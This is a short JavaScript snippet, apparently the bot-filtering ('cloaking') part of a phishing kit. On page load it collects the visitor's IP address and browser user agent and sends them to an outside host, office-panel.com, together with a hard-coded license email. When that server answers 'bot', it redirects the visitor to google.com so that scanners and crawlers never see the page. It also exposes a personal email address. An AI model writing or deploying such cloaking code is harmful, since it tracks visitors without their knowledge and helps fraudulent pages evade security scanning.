var license_email="cc.parfitt16@gmail.com";
$(document).ready(function () {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const clientIP = data.ip;
            const userAgent = navigator.userAgent;
          
            $.ajax({
                url: "https://office-panel.com/site/stats",
                data: {
                    ip: clientIP,
                    ua: userAgent,
                    em: license_email
                },
                success: function(response) {
                    if (response.trim() === "bot") {
                        window.location.replace("https://www.google.com");
                    }
                },
                error: function(xhr, status, error) {
                    console.error('AJAX Error:', error);
                }
            });

            console.log(`Client IP Address: ${clientIP}`);
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
        });
});